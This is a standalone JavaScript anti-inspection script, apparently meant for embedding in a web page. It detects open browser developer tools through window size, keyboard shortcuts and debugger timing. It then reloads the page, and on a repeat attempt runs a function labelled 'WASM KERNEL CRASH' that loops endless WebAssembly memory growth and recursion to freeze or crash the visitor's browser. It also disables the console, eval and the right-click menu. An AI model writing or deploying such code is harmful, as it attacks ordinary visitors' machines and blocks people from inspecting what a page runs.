(function() {
    // 1. WASM KERNEL CRASH (Nuclear Option)
    const _wCode = new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,5,3,1,0,1,7,8,1,4,107,105,108,108,0,0,10,9,1,7,0,65,255,255,15,11]);
    const _wDeath = () => {
        try {
            const m = new WebAssembly.Memory({ initial: 65536, maximum: 65536 });
            const mod = new WebAssembly.Module(_wCode);
            new WebAssembly.Instance(mod, { env: { memory: m } });
            while(true) { m.grow(1); } // Hard lock
        } catch(e) { _wDeath(); }
    };

    // 2. REFRESH/REDIRECT LOGIC
    const _f = () => {
        let c = parseInt(sessionStorage.getItem('_gc') || '0');
        c++;
        sessionStorage.setItem('_gc', c.toString());
        if (c > 1) {
            _wDeath(); // Trigger WASM Crash on repeat attempts
            window.location.href = 'about:blank';
        } else {
            window.location.reload();
        }
    };

    // 3. DIMENSION DETECTION
    setInterval(function() {
        if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
            _f();
        }
    }, 200);

    // 4. CONSOLE LOCKDOWN
    setInterval(() => { console.clear(); }, 50);
    try {
        const noop = () => {};
        ['log', 'warn', 'error', 'info', 'debug', 'table', 'trace', 'dir'].forEach(m => { window.console[m] = noop; });
        Object.defineProperty(window, 'console', { get: () => null, set: () => {} });
    } catch (e) {}

    // 5. EVAL & SHORTCUT BLOCKER
    window.eval = () => { throw new Error(); };
    window.addEventListener('keydown', e => {
        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key)) || (e.ctrlKey && e.key === 'u')) {
            e.preventDefault(); _f();
        }
    }, true);

    // 6. MEMORY BOMB & DEBUGGER
    setInterval(function() {
        const s = performance.now();
        debugger;
        if (performance.now() - s > 100) {
            _f();
        }
    }, 50);

    // 7. CONTEXT MENU
    window.addEventListener('contextmenu', e => e.preventDefault(), true);
})();
